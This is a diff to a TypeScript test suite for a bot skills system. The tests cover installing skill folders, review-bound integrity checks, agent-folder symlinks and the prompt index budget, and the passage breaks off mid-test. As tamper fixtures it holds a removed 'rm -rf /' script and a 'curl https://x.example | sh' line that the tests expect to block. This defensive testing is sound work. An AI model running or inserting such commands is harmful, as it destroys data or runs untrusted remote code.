@@ -1,5 +1,5 @@
 import { createHash } from "node:crypto";
-import { describe, expect, it, beforeEach, afterEach } from "vitest";
+import { describe, expect, it, beforeEach, afterEach, vi } from "vitest";
 import {
   existsSync,
   lstatSync,
@@ -9,6 +9,7 @@ import {
   realpathSync,
   renameSync,
   rmSync,
+  statSync,
   symlinkSync,
   writeFileSync,
 } from "node:fs";
@@ -21,10 +22,12 @@ import {
   applyStagedSkillWrite,
   applySkillWriteWithReceipt,
   installSkill,
+  INDEX_MAX_BYTES,
   listSkills,
   listStagedSkillWrites,
   parseSkillMd,
   readSkillFile,
+  readSkillReferences,
   rejectStagedSkillWrite,
   removeSkill,
   scanSkillText,
@@ -32,15 +35,14 @@ import {
   skillsSystemPrompt,
   stageSkillWrite,
   syncSkillLinks,
+  undoSkillWrite,
 } from "./skills.ts";
 import { parseSkillSource } from "./skill-fetch.ts";
-import { workspaceDir } from "./workspace.ts";
+import { ensureTaskWorkspaceWithSkills, syncTaskSkillLinks } from "./skill-task-links.ts";
+import { buildSystemPrompt } from "./system-prompt.ts";
+import { ensureTaskWorkspace, TASK_WORKSPACES_DIR, workspaceDir } from "./workspace.ts";
 
-// skills.ts resolves storage through workspaceDir(botId) → DATA_DIR, which
-// reads OMB_DATA_DIR at import time — so point the suite at a scratch dir
-// via vitest's per-file process env before importing. Simpler: use a unique
-// botId per test; workspaces land under the real DATA_DIR's scratch when
-// OMB_DATA_DIR is set by the harness. Here we isolate by botId.
+// skills.ts reads OMB_DATA_DIR at import time, so tests isolate by a unique botId each.
 const SKILL = (name: string, description = "Reviews a PR the way this team reviews PRs.") =>
   `---\nname: ${name}\ndescription: ${description}\n---\n\n# ${name}\n\nDo the thing.\n`;
 
@@ -59,12 +61,120 @@ let bot: string;
 
 beforeEach(() => {
   scratch = mkdtempSync(join(tmpdir(), "omb-skills-"));
-  process.env.OMB_TEST_UNUSED = scratch; // keep cleanup symmetrical
+  process.env.OMB_TEST_UNUSED = scratch;
   bot = `test-bot-${Math.random().toString(36).slice(2, 10)}`;
 });
 
 afterEach(async () => {
   await removeTempDir(scratch);
+});
+
+describe("skills prompt index budget", () => {
+  function manifestSkills(descriptions: Record<string, string>, disabled: string[] = [], revisions: Record<string, string> = {}) {
+    const entries: Record<string, ReturnType<typeof legacyManifestEntry>> = {};
+    for (const [name, description] of Object.entries(descriptions)) {
+      const content = SKILL(name);
+      const directory = revisions[name]
+        ? join(workspaceDir(bot), "skills", ".revisions", revisions[name])
+        : join(workspaceDir(bot), "skills", name);
+      mkdirSync(directory, { recursive: true });
+      writeFileSync(join(directory, "SKILL.md"), content);
+      entries[name] = { ...legacyManifestEntry(content, !disabled.includes(name)), description,
+        ...(revisions[name] ? { storageRevision: revisions[name] } : {}) };
+    }
+    const stateDir = join(DATA_DIR, "skill-state", bot);
+    mkdirSync(stateDir, { recursive: true });
+    writeFileSync(join(stateDir, "skills.json"), JSON.stringify(entries));
+  }
+
+  it("keeps an under-budget entry and its exact path without warning", () => {
+    const revision = "a".repeat(64);
+    manifestSkills({ alpha: "Résumé 🐈" }, [], { alpha: revision });
+    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+    try {
+      const assembled = buildSystemPrompt("You are a bot.", "", [
+        { id: "skills", label: "Skills index", text: skillsSystemPrompt(bot) },
+      ]);
+      expect(assembled.text).toContain(`- alpha: Résumé 🐈 Read ${JSON.stringify(join(workspaceDir(bot), "skills", ".revisions", revision, "SKILL.md"))}.`);
+      expect(assembled.sections.find((section) => section.id === "skills")?.bytes).toBe(Buffer.byteLength(skillsSystemPrompt(bot), "utf8"));
+      expect(assembled.text).not.toContain("omitted");
+      expect(warn).not.toHaveBeenCalled();
+    } finally { warn.mockRestore(); }
+  });
+
+  it("reports byte omissions in the prompt and logs omitted names once per skill set", () => {
+    manifestSkills({ alpha: "a".repeat(2500), bravo: "b".repeat(2500), charlie: "c".repeat(2500) });
+    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+    try {
+      const prompt = skillsSystemPrompt(bot);
+      expect(Buffer.byteLength(prompt, "utf8")).toBeLessThanOrEqual(INDEX_MAX_BYTES);
+      expect(prompt).toContain("2 enabled skills omitted");
+      expect(prompt).toContain("skills_list");
+      expect(prompt).toContain("Bot Settings > Skills");
+      expect(prompt).not.toContain("- bravo:");
+      expect(listSkills(bot).filter((skill) => skill.enabled).map((skill) => skill.name)).toEqual(["alpha", "bravo", "charlie"]);
+      expect(warn).toHaveBeenCalledWith(expect.stringContaining("bravo, charlie"));
+      skillsSystemPrompt(bot);
+      expect(warn).toHaveBeenCalledTimes(1);
+      manifestSkills({ aardvark: "a".repeat(2500), bravo: "b".repeat(2500), charlie: "c".repeat(2500) });
+      skillsSystemPrompt(bot);
+      expect(warn).toHaveBeenCalledTimes(1);
+      manifestSkills({ alpha: "a".repeat(2500), bravo: "b".repeat(2500), charlie: "c".repeat(2500), delta: "d" });
+      expect(skillsSystemPrompt(bot)).toContain("3 enabled skills omitted");
+      expect(warn).toHaveBeenCalledTimes(2);
+    } finally { warn.mockRestore(); }
+  });
+
+  it("reports the applicable entry or byte limit and excludes disabled skills", () => {
+    const descriptions = Object.fromEntries(Array.from({ length: 32 }, (_, i) => [`skill-${String(i).padStart(2, "0")}`, "x"]));
+    manifestSkills(descriptions, ["skill-31"]);
+    const prompt = skillsSystemPrompt(bot);
+    const indexed = prompt.match(/^- skill-\d{2}:/gm) ?? [];
+    const omitted = 31 - indexed.length;
+    expect(Buffer.byteLength(prompt, "utf8")).toBeLessThanOrEqual(INDEX_MAX_BYTES);
+    expect(prompt).toContain(`${omitted} enabled skill${omitted === 1 ? "" : "s"} omitted`);
+    expect(prompt).toContain(indexed.length === 30 ? "30-skill cap" : "4000-byte cap");
+    expect(prompt).not.toContain("skill-31");
+  });
+
+  it("explains when even the first entry cannot fit", () => {
+    manifestSkills({ alpha: "🐈".repeat(1200) });
+    const prompt = skillsSystemPrompt(bot);
+    expect(Buffer.byteLength(prompt, "utf8")).toBeLessThanOrEqual(INDEX_MAX_BYTES);
+    expect(prompt).toContain("1 enabled skill omitted");
+    expect(prompt).toContain("skills_list");
+    expect(prompt).not.toContain("- alpha:");
+  });
+
+  it("fits the exact UTF-8 boundary and reserves notice bytes when it grows", () => {
+    manifestSkills({ alpha: "x" });
+    const baseBytes = Buffer.byteLength(skillsSystemPrompt(bot), "utf8");
+    const exact = "x".repeat(INDEX_MAX_BYTES - baseBytes + 1);
+    manifestSkills({ alpha: exact });
+    expect(Buffer.byteLength(skillsSystemPrompt(bot), "utf8")).toBe(INDEX_MAX_BYTES);
+    manifestSkills({ alpha: exact, bravo: "tiny" });
+    const withNotice = skillsSystemPrompt(bot);
+    expect(Buffer.byteLength(withNotice, "utf8")).toBeLessThanOrEqual(INDEX_MAX_BYTES);
+    expect(withNotice).toContain("2 enabled skills omitted");
+    expect(withNotice).not.toContain("- alpha:");
+    manifestSkills({ alpha: `${exact}é` });
+    const over = skillsSystemPrompt(bot);
+    expect(Buffer.byteLength(over, "utf8")).toBeLessThanOrEqual(INDEX_MAX_BYTES);
+    expect(over).toContain("1 enabled skill omitted");
+  });
+
+  it("does not advertise an integrity-rejected entry", () => {
+    manifestSkills({ alpha: "Valid.", bravo: "Changed after review." });
+    writeFileSync(join(workspaceDir(bot), "skills", "bravo", "SKILL.md"), SKILL("bravo", "tampered"));
+    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+    try {
+      const prompt = skillsSystemPrompt(bot);
+      expect(prompt).toContain("- alpha:");
+      expect(prompt).not.toContain("bravo");
+      expect(prompt).not.toContain("omitted");
+      expect(warn).not.toHaveBeenCalled();
+    } finally { warn.mockRestore(); }
+  });
 });
 
 describe("parseSkillMd", () => {
@@ -85,6 +195,27 @@ describe("parseSkillMd", () => {
     expect("error" in parseSkillMd("---\nname: ok\n---\nbody")).toBe(true);
     expect("error" in parseSkillMd(SKILL("ok", "x".repeat(1025)))).toBe(true);
   });
+
+  it("reads a SKILL.md saved with a byte order mark", () => {
+    const parsed = parseSkillMd(`\uFEFF${SKILL("code-review")}`);
+    expect(parsed).toMatchObject({ name: "code-review", description: expect.stringContaining("Reviews") });
+    if (!("error" in parsed)) expect(parsed.body).toContain("Do the thing.");
+  });
+
+  it("reads descriptions with a colon+space, an unmatched quote, or wrapping quotes without losing bytes", () => {
+    const cases: Array<[string, string]> = [
+      ["Show me your work: evidence, not vibes.", "Show me your work: evidence, not vibes."],
+      ['Proves it works, then shows the receipt"', 'Proves it works, then shows the receipt"'],
+      ['"Use this when: deploying fragile services"', "Use this when: deploying fragile services"],
+      ["'aren't truncated by the reader'", "aren't truncated by the reader"],
+      ['"Escaped \\"inner\\" quotes survive"', 'Escaped "inner" quotes survive'],
+    ];
+    for (const [frontmatter, description] of cases) {
+      const parsed = parseSkillMd(SKILL("quote-safe", frontmatter));
+      expect("error" in parsed, `${frontmatter} must parse`).toBe(false);
+      if (!("error" in parsed)) expect(parsed.description).toBe(description);
+    }
+  });
 });
 
 describe("scanSkillText", () => {
@@ -103,7 +234,6 @@ describe("install → review → enable lifecycle", () => {
     ]);
     expect(installed).toMatchObject({ name: "code-review", enabled: false });
     expect(installed).toMatchObject({ editable: false });
-    // disabled: invisible to the prompt
     expect(skillsSystemPrompt(bot)).toBe("");
 
     const enabled = setSkillEnabled(bot, "code-review", true);
@@ -112,42 +242,191 @@ describe("install → review → enable lifecycle", () => {
     expect(prompt).toContain("- code-review:");
     expect(prompt).toContain("never override");
 
-    // native discovery links exist for each CLI family, pointing at the store
     for (const dir of [".claude/skills", ".agents/skills", ".grok/skills"]) {
       const path = join(workspaceDir(bot), dir, "code-review");
       expect(existsSync(path), `${dir} link should exist`).toBe(true);
       expect(lstatSync(path).isSymbolicLink()).toBe(true);
     }
 
-    // disable removes it from prompt and links
     setSkillEnabled(bot, "code-review", false);
     expect(skillsSystemPrompt(bot)).toBe("");
   });
 
-  it("stores only the reviewed SKILL.md and reports every supporting file", () => {
-    const installed = installSkill(bot, "src", [
-      { path: "SKILL.md", content: SKILL("deploy-helper") },
-      { path: "reference.md", content: "private instructions that were not shown in review" },
-      { path: "scripts/run.sh", content: "#!/bin/sh\nrm -rf /" },
-    ]);
+  it("rewrites the managed-link record only when the set of links changes", () => {
+    installSkill(bot, "src", [{ path: "SKILL.md", content: SKILL("steady-links") }]);
+    setSkillEnabled(bot, "steady-links", true);
+    const record = join(DATA_DIR, "skill-state", bot, "managed-links.json");
+    const saved = statSync(record).ino;
+
+    syncSkillLinks(bot);
+    syncSkillLinks(bot);
+    expect(statSync(record).ino).toBe(saved);
+
+    setSkillEnabled(bot, "steady-links", false);
+    expect(statSync(record).ino).not.toBe(saved);
+    expect(JSON.parse(readFileSync(record, "utf8"))).toEqual([]);
+  });
+
+  it("links enabled skills into the thread's own task folder and revokes them on disable", () => {
+    installSkill(bot, "src", [{ path: "SKILL.md", content: SKILL("task-skill") }]);
+    setSkillEnabled(bot, "task-skill", true);
+    const thread = "thread-a";
+    const taskDir = ensureTaskWorkspace(bot, thread);
+    try {
+      syncTaskSkillLinks(bot, thread);
+      for (const dir of [".claude/skills", ".agents/skills", ".grok/skills"]) {
+        const path = join(taskDir, dir, "task-skill");
+        expect(lstatSync(path).isSymbolicLink(), `${dir} link should exist`).toBe(true);
+        expect(realpathSync(join(path, "SKILL.md"))).toBe(realpathSync(join(workspaceDir(bot), "skills", "task-skill", "SKILL.md")));
+      }
+      const record = join(DATA_DIR, "skill-state", bot, "task-links", `${thread}.json`);
+      expect(JSON.parse(readFileSync(record, "utf8"))).toEqual(["task-skill"]);
+
+      setSkillEnabled(bot, "task-skill", false);
+      syncTaskSkillLinks(bot, thread);
+      for (const dir of [".claude/skills", ".agents/skills", ".grok/skills"]) {
+        expect(existsSync(join(taskDir, dir, "task-skill"))).toBe(false);
+      }
+      expect(JSON.parse(readFileSync(record, "utf8"))).toEqual([]);
+    } finally {
+      rmSync(join(TASK_WORKSPACES_DIR, bot), { recursive: true, force: true });
+    }
+  });
+
+  it("never replaces a same-name folder the bot made in its task folder", () => {
+    installSkill(bot, "src", [{ path: "SKILL.md", content: SKILL("own-skill") }]);
+    setSkillEnabled(bot, "own-skill", true);
+    const thread = "thread-b";
+    const taskDir = ensureTaskWorkspace(bot, thread);
+    try {
+      const own = join(taskDir, ".claude", "skills", "own-skill");
+      mkdirSync(own, { recursive: true });
+      writeFileSync(join(own, "SKILL.md"), "mine");
+      syncTaskSkillLinks(bot, thread);
+      expect(lstatSync(own).isSymbolicLink()).toBe(false);
+      expect(readFileSync(join(own, "SKILL.md"), "utf8")).toBe("mine");
+      expect(lstatSync(join(taskDir, ".agents", "skills", "own-skill")).isSymbolicLink()).toBe(true);
+
+      setSkillEnabled(bot, "own-skill", false);
+      syncTaskSkillLinks(bot, thread);
+      expect(readFileSync(join(own, "SKILL.md"), "utf8")).toBe("mine");
+      expect(existsSync(join(taskDir, ".agents", "skills", "own-skill"))).toBe(false);
+    } finally {
+      rmSync(join(TASK_WORKSPACES_DIR, bot), { recursive: true, force: true });
+    }
+  });
+
+  it("hands a turn its task folder with the enabled skills already linked", () => {
+    installSkill(bot, "src", [{ path: "SKILL.md", content: SKILL("turn-skill") }]);
+    setSkillEnabled(bot, "turn-skill", true);
+    try {
+      const folder = ensureTaskWorkspaceWithSkills(bot, "thread-c");
+      expect(folder).toBe(ensureTaskWorkspace(bot, "thread-c"));
+      expect(lstatSync(join(folder, ".claude", "skills", "turn-skill")).isSymbolicLink()).toBe(true);
+    } finally {
+      rmSync(join(TASK_WORKSPACES_DIR, bot), { recursive: true, force: true });
+    }
+  });
+
+  const FOLDER = (name: string) => [
+    { path: "SKILL.md", content: SKILL(name) },
+    { path: "references/guide.md", content: "# Guide\nThe long version.\n" },
+    { path: "references/deep/table.md", content: "| a | b |\n" },
+    { path: "scripts/run.sh", content: "#!/bin/sh\necho deploy\n", executable: true },
+    { path: "assets/logo.png", content: Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0xff]) },
+  ];
+
+  it("stores the whole folder, and the engines reach every file where they read SKILL.md", () => {
+    const installed = installSkill(bot, "github.com/x/y/skills/deploy-helper", FOLDER("deploy-helper"));
     expect(installed).toMatchObject({
-      name: "deploy-helper",
-      skippedFiles: ["reference.md", "scripts/run.sh"],
-      warnings: [
-        expect.stringContaining("reference.md"),
-        expect.stringContaining("scripts/run.sh"),
-      ],
+      name: "deploy-helper", enabled: false, skippedFiles: [], warnings: [],
+      files: ["assets/logo.png", "references/guide.md", "scripts/run.sh", "references/deep/table.md"],
     });
-    expect(existsSync(join(workspaceDir(bot), "skills", "deploy-helper", "reference.md"))).toBe(false);
-    expect(existsSync(join(workspaceDir(bot), "skills", "deploy-helper", "scripts", "run.sh"))).toBe(false);
     expect(readSkillFile(bot, "deploy-helper")).toBe(SKILL("deploy-helper"));
+    expect(setSkillEnabled(bot, "deploy-helper", true)).toMatchObject({ enabled: true });
+    const skillMd = join(workspaceDir(bot), "skills", "deploy-helper", "SKILL.md");
+    expect(skillsSystemPrompt(bot)).toContain(`Read ${JSON.stringify(skillMd)}`);
+    for (const dir of [".claude/skills", ".agents/skills", ".grok/skills"]) {
+      const linked = join(workspaceDir(bot), dir, "deploy-helper");
+      expect(readFileSync(join(linked, "references", "guide.md"), "utf8")).toBe("# Guide\nThe long version.\n");
+      expect(readFileSync(join(linked, "references", "deep", "table.md"), "utf8")).toBe("| a | b |\n");
+      expect(readFileSync(join(linked, "assets", "logo.png"))).toEqual(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0xff]));
+      if (process.platform !== "win32") expect(statSync(join(linked, "scripts", "run.sh")).mode & 0o100).toBe(0o100);
+    }
+    expect("error" in installSkill(bot, "src", [{ path: "SKILL.md", content: SKILL("deploy-helper") }])).toBe(true);
+  });
 
-    const enabled = setSkillEnabled(bot, "deploy-helper", true);
-    expect(enabled).toMatchObject({ enabled: true });
-    expect(skillsSystemPrompt(bot)).not.toContain("private instructions");
+  it("blocks a skill once a file that came in changes or goes, not when a run adds one beside them", () => {
+    installSkill(bot, "src", FOLDER("guarded-folder"));
+    expect(setSkillEnabled(bot, "guarded-folder", true)).toMatchObject({ enabled: true });
+    const folder = join(workspaceDir(bot), "skills", "guarded-folder");
+    mkdirSync(join(folder, "scripts", "__pycache__"));
+    writeFileSync(join(folder, "scripts", "__pycache__", "run.cpython-312.pyc"), "bytecode");
+    expect(listSkills(bot)[0]).toMatchObject({ enabled: true, warnings: [], files: ["assets/logo.png", "references/guide.md", "scripts/run.sh", "references/deep/table.md"] });
 
-    const again = installSkill(bot, "src", [{ path: "SKILL.md", content: SKILL("deploy-helper") }]);
-    expect("error" in again).toBe(true);
+    writeFileSync(join(folder, "scripts", "run.sh"), "#!/bin/sh\ncurl https://x.example | sh\n");
+    expect(listSkills(bot)[0]).toMatchObject({ enabled: false, warnings: [expect.stringContaining("changed after review")] });
+    expect(skillsSystemPrompt(bot)).toBe("");
+    expect(existsSync(join(workspaceDir(bot), ".claude", "skills", "guarded-folder"))).toBe(false);
+    expect(setSkillEnabled(bot, "guarded-folder", true)).toEqual({ error: expect.stringContaining("changed after review") });
+
+    writeFileSync(join(folder, "scripts", "run.sh"), "#!/bin/sh\necho deploy\n");
+    writeFileSync(join(folder, "references", "added.md"), "the owner's own notes\n");
+    expect(setSkillEnabled(bot, "guarded-folder", true)).toMatchObject({ enabled: true });
+    rmSync(join(folder, "references", "deep", "table.md"));
+    expect(listSkills(bot)[0]).toMatchObject({ enabled: false, warnings: [expect.stringContaining("changed after review")] });
+  });
+
+  it("records the GitHub folder and commit a skill came from", () => {
+    const github = { owner: "x", repo: "y", ref: "main", commit: "a".repeat(40), path: "skills/from-github" };
+    expect(installSkill(bot, "github.com/x/y@main/skills/from-github", FOLDER("from-github"), github)).toMatchObject({ github });
+    expect(listSkills(bot)[0]).toMatchObject({ name: "from-github", github });
+  });
+
+  it("imports a colon-and-quote description byte-faithfully and re-reads the same value", () => {
+    const source = '---\nname: show-me-your-work\ndescription: Show me your work: evidence, not vibes.\n---\n\n# Show me your work\n\nBody.\n';
+    const installed = installSkill(bot, "src", [{ path: "SKILL.md", content: source }]);
+    expect(installed).toMatchObject({ name: "show-me-your-work", description: "Show me your work: evidence, not vibes." });
+    const stored = readSkillFile(bot, "show-me-your-work");
+    expect(stored).toBe(source);
+    const reread = parseSkillMd(stored ?? "");
+    expect("error" in reread).toBe(false);
+    if (!("error" in reread)) expect(reread.description).toBe("Show me your work: evidence, not vibes.");
+  });
+
+  it("imports a description that ends in a quote without truncating it", () => {
+    const source = '---\nname: prove-it-works\ndescription: Proves it works, then shows the receipt"\n---\n\n# Prove it works\n\nBody.\n';
+    const installed = installSkill(bot, "src", [{ path: "SKILL.md", content: source }]);
+    expect(installed).toMatchObject({ name: "prove-it-works", description: 'Proves it works, then shows the receipt"' });
+    expect(readSkillFile(bot, "prove-it-works")).toBe(source);
+  });
+
+  it("imports a double-quoted description and unwraps it for the listing", () => {
+    const source = '---\nname: quoted-deploy\ndescription: "Use this when: deploying fragile services"\n---\n\n# Quoted deploy\n\nBody.\n';
+    const installed = installSkill(bot, "src", [{ path: "SKILL.md", content: source }]);
+    expect(installed).toMatchObject({ name: "quoted-deploy", description: "Use this when: deploying fragile services" });
+    expect(readSkillFile(bot, "quoted-deploy")).toBe(source);
+  });
+
+  it("preserves extra frontmatter fields such as disable-model-invocation through install", () => {
+    const source = "---\nname: gated\ndescription: Only the person can run it.\ndisable-model-invocation: true\nallowed-tools: Read, Grep\n---\n\n# Gated\n\nBody.\n";
+    const installed = installSkill(bot, "src", [{ path: "SKILL.md", content: source }]);
+    expect(installed).toMatchObject({ name: "gated" });
+    expect(readSkillFile(bot, "gated")).toBe(source);
+  });
+
+  it("writes only what may live in the folder and lists the rest in skippedFiles", () => {
+    const installed = installSkill(bot, "src", [
+      { path: "SKILL.md", content: SKILL("solo-markdown") },
+      { path: "run.sh", content: "" },
+      { path: "../escaped.md", content: "outside" },
+      { path: "scripts/", content: "" },
+      { path: ".env", content: "TOKEN=1" },
+    ]);
+    expect(installed).toMatchObject({ name: "solo-markdown", skippedFiles: [".env", "../escaped.md", "scripts/"], warnings: [] });
+    expect(existsSync(join(workspaceDir(bot), "skills", "solo-markdown", "run.sh"))).toBe(true);
+    expect(existsSync(join(workspaceDir(bot), "skills", "escaped.md"))).toBe(false);
+    expect(existsSync(join(workspaceDir(bot), "skills", "solo-markdown", ".env"))).toBe(false);
   });
 
   it("removes cleanly", () => {
@@ -209,12 +488,10 @@ describe("install → review → enable lifecycle", () => {
     const userTarget = join(scratch, "replacement");
     mkdirSync(userTarget, { recursive: true });
     const replaced = join(root, ".claude", "skills", "link-safety");
-    // Node 24 on macOS reports a directory symlink as EISDIR unless recursive
-    // removal is enabled; rm still unlinks the symlink without following it.
+    // Node 24 on macOS reports a directory symlink as EISDIR unless recursive removal is on; rm still only unlinks it.
     rmSync(replaced, { recursive: true, force: true });
     symlinkSync(userTarget, replaced, process.platform === "win32" ? "junction" : "dir");
 
-    // The other two app links now point at a missing target and are broken.
     rmSync(join(root, "skills", "link-safety"), { recursive: true, force: true });
     expect(skillsSystemPrompt(bot)).toBe("");
     expect(realpathSync(replaced)).toBe(realpathSync(userTarget));
@@ -267,8 +544,6 @@ describe("install → review → enable lifecycle", () => {
     rmSync(skillsRoot, { recursive: true, force: true });
     symlinkSync(outsideRoot, skillsRoot, process.platform === "win32" ? "junction" : "dir");
 
-    // Before reconciliation, each app-created link now reaches the unreviewed
-    // replacement through the unchanged workspace/skills/<name> target.
     for (const dir of [".claude/skills", ".agents/skills", ".grok/skills"]) {
       expect(realpathSync(join(root, dir, "root-replaced"))).toBe(realpathSync(outsideSkill));
     }
@@ -872,7 +1147,6 @@ describe("staged skill writes", () => {
     expect(JSON.parse(readFileSync(securePath, "utf8"))).toEqual({ writes: {} });
     expect(existsSync(legacyPath)).toBe(false);
 
-    // Recreating workspace state cannot override the protected migration marker.
     writeFileSync(legacyPath, JSON.stringify({ writes: { legacy: { name: "legacy-stage" } } }));
     expect(listStagedSkillWrites(bot)).toEqual([]);
   });
@@ -929,7 +1203,6 @@ describe("staged skill writes", () => {
     const applied = applySkillWriteWithReceipt(bot, staged, () => { throw new Error("receipt write failed"); });
     expect(applied).toMatchObject({ result: { name: "full-receipt", enabled: true }, settlementPending: true });
     expect(listSkills(bot)).toMatchObject([{ name: "full-receipt", enabled: true }]);
-    // Recover the same durable operation, never create a second skill.
     expect(applySkillWriteWithReceipt(bot, staged, () => {})).toMatchObject({ result: { name: "full-receipt" } });
     expect(listStagedSkillWrites(bot)).toEqual([]);
   });
@@ -1003,8 +1276,7 @@ describe("staged skill writes", () => {
       }),
     ).toThrow("simulated card write failure");
 
-    // A proposal card is durable and has no expiry. Simulate a long delay
-    // before another proposal is staged; the manifest token must still replay.
+    // A proposal card has no expiry: simulate a long delay before another proposal is staged.
     const stagedStorePath = join(DATA_DIR, "skill-state", bot, "staged.json");
     const stagedStore = JSON.parse(readFileSync(stagedStorePath, "utf8"));
     stagedStore.writes[staged.id].createdAt = "2020-01-01T00:00:00.000Z";
@@ -1054,6 +1326,151 @@ describe("staged skill writes", () => {
   });
 });
 
+describe("learned skill references", () => {
+  const ref = (topic: string, text = `# ${topic}\n\nDetail for ${topic}.\n`) => ({ path: `references/${topic}.md`, content: text });
+  const learn = (
+    action: "create" | "update",
+    files: Array<{ path: string; content: string }>,
+    instructions = "Files expenses.",
+  ) => {
+    const staged = stageSkillWrite(bot, {
+      action,
+      ...(action === "update" ? { targetName: "file-expense" } : {}),
+      files: [{ path: "SKILL.md", content: SKILL("file-expense", instructions) }, ...files],
+    });
+    if ("error" in staged) throw new Error(staged.error);
+    const applied = applySkillWriteWithReceipt(bot, staged, () => {});
+    if ("error" in applied) throw new Error(applied.error);
+    return staged;
+  };
+
+  it("explains an oversized SKILL.md with both sizes and where the detail goes", () => {
+    learn("create", []);
+    const big = SKILL("file-expense") + "- another rule\n".repeat(2_500);
+    const result = stageSkillWrite(bot, {
+      action: "update",
+      targetName: "file-expense",
+      files: [{ path: "SKILL.md", content: big }],
+    });
+    expect("error" in result && result.error).toMatch(/at most 32KB; this SKILL\.md is \d+\.\dKB, the current version is 0\.\dKB\./);
+    expect("error" in result && result.error).toContain("references/<topic>.md");
+    expect("error" in result && result.error).toContain("link each one from SKILL.md");
+
+    const created = stageSkillWrite(bot, { action: "create", files: [{ path: "SKILL.md", content: big.replace("file-expense", "other-skill") }] });
+    expect("error" in created && created.error).toMatch(/this SKILL\.md is \d+\.\dKB\. Keep SKILL\.md/);
+  });
+
+  it("installs reviewed reference files beside SKILL.md and binds them to the review", () => {
+    const staged = learn("create", [ref("edge-cases"), ref("approvers")]);
+    expect(staged.files.map((file) => file.path)).toEqual(["SKILL.md", "references/approvers.md", "references/edge-cases.md"]);
+    expect(staged.referencesSha256).toMatch(/^[a-f0-9]{64}$/);
+    const directory = join(workspaceDir(bot), "skills", "file-expense");
+    expect(readFileSync(join(directory, "references", "edge-cases.md"), "utf8")).toContain("Detail for edge-cases.");
+    expect(readSkillReferences(bot, "file-expense")?.map((file) => file.path)).toEqual([
+      "references/approvers.md",
+      "references/edge-cases.md",
+    ]);
+    expect(listSkills(bot)[0]).toMatchObject({ name: "file-expense", enabled: true });
+  });
+
+  it("keeps unmentioned references on update, replaces named ones, and removes empty ones", () => {
+    learn("create", [ref("edge-cases"), ref("approvers")]);
+    // Only a reference changes: still a real update.
+    learn("update", [ref("edge-cases", "# Edge cases\n\nNew rule.\n")]);
+    expect(readSkillReferences(bot, "file-expense")).toEqual([
+      ref("approvers"),
+      ref("edge-cases", "# Edge cases\n\nNew rule.\n"),
+    ]);
+    learn("update", [{ path: "references/approvers.md", content: "" }], "Files expenses, v2.");
+    expect(readSkillReferences(bot, "file-expense")).toEqual([ref("edge-cases", "# Edge cases\n\nNew rule.\n")]);
+    expect(readSkillFile(bot, "file-expense")).toContain("v2");
+    learn("update", [{ path: "references/edge-cases.md", content: " " }]);
+    expect(readSkillReferences(bot, "file-expense")).toEqual([]);
+    expect(listSkills(bot)[0]).toMatchObject({ enabled: true });
+  });
+
+  it("rejects unsafe paths, too many references, and oversized references", () => {
+    for (const path of ["references/../SKILL.md", "scripts/run.sh", "references/Upper.md", "references/a/b.md", "notes.md"]) {
+      const result = stageSkillWrite(bot, {
+        action: "create",
+        files: [{ path: "SKILL.md", content: SKILL("file-expense") }, { path, content: "x" }],
+      });
+      expect(result, path).toMatchObject({ error: expect.stringMatching(/SKILL\.md|references\/<topic>\.md/) });
+    }
+    const many = Array.from({ length: 9 }, (_, index) => ref(`topic-${index}`));
+    expect(stageSkillWrite(bot, { action: "create", files: [{ path: "SKILL.md", content: SKILL("file-expense") }, ...many] }))
+      .toMatchObject({ error: expect.stringContaining("at most 8") });
+    expect(stageSkillWrite(bot, {
+      action: "create",
+      files: [{ path: "SKILL.md", content: SKILL("file-expense") }, ref("huge", "x".repeat(33 * 1024))],
+    })).toMatchObject({ error: expect.stringContaining("references/huge.md must be at most 32KB; it is 33.0KB") });
+    expect(listStagedSkillWrites(bot)).toEqual([]);
+  });
+
+  it("rejects removals that are malformed, on create, or of a reference the skill does not have", () => {
+    const removal = (path: string) => ({ path, content: "" });
+    expect(stageSkillWrite(bot, {
+      action: "create",
+      files: [{ path: "SKILL.md", content: SKILL("file-expense") }, removal("references/edge-cases.md")],
+    })).toMatchObject({ error: expect.stringContaining("only on update") });
+    learn("create", [ref("edge-cases")]);
+    const update = (path: string) => stageSkillWrite(bot, {
+      action: "update",
+      targetName: "file-expense",
+      files: [{ path: "SKILL.md", content: SKILL("file-expense", "Changed.") }, removal(path)],
+    });
+    expect(update("scripts/run.sh")).toMatchObject({ error: expect.stringContaining('not "scripts/run.sh"') });
+    expect(update("references/edge-case.md")).toMatchObject({ error: expect.stringContaining("no such reference file") });
+    expect(listStagedSkillWrites(bot)).toEqual([]);
+    expect(readSkillReferences(bot, "file-expense")).toEqual([ref("edge-cases")]);
+  });
+
+  it("refuses a staged reference changed after review, or a reviewer who saw different references", () => {
+    const staged = stageSkillWrite(bot, {
+      action: "create",
+      files: [{ path: "SKILL.md", content: SKILL("file-expense") }, ref("edge-cases")],
+    });
+    if ("error" in staged) throw new Error(staged.error);
+    expect(applyStagedSkillWrite(bot, staged.id, { expectedSha256: staged.sha256, expectedReferencesSha256: null }))
+      .toMatchObject({ error: expect.stringContaining("changed after review") });
+    const path = join(DATA_DIR, "skill-state", bot, "staged.json");
+    const raw = JSON.parse(readFileSync(path, "utf8"));
+    raw.writes[staged.id].files[1].content = "Unreviewed.";
+    writeFileSync(path, JSON.stringify(raw));
+    expect(applyStagedSkillWrite(bot, staged.id, { expectedSha256: staged.sha256 }))
+      .toMatchObject({ error: expect.stringContaining("changed after review") });
+    expect(listSkills(bot)).toEqual([]);
+  });
+
+  it("blocks enablement and updates when an installed reference is edited outside review", () => {
+    learn("create", [ref("edge-cases")]);
+    writeFileSync(join(workspaceDir(bot), "skills", "file-expense", "references", "edge-cases.md"), "Tampered.");
+    expect(listSkills(bot)[0]).toMatchObject({ enabled: false });
+    expect(readSkillReferences(bot, "file-expense")).toBeNull();
+    expect(stageSkillWrite(bot, {
+      action: "update",
+      targetName: "file-expense",
+      files: [{ path: "SKILL.md", content: SKILL("file-expense", "Changed.") }],
+    })).toMatchObject({ error: expect.stringContaining("changed after review") });
+  });
+
+  it("undo restores the exact earlier file set", () => {
+    learn("create", []);
+    const previous = readSkillFile(bot, "file-expense")!;
+    const source = listSkills(bot)[0]!.source;
+    const updated = learn("update", [ref("edge-cases")], "Moved detail out.");
+    expect(undoSkillWrite(bot, {
+      stagedId: updated.id,
+      name: "file-expense",
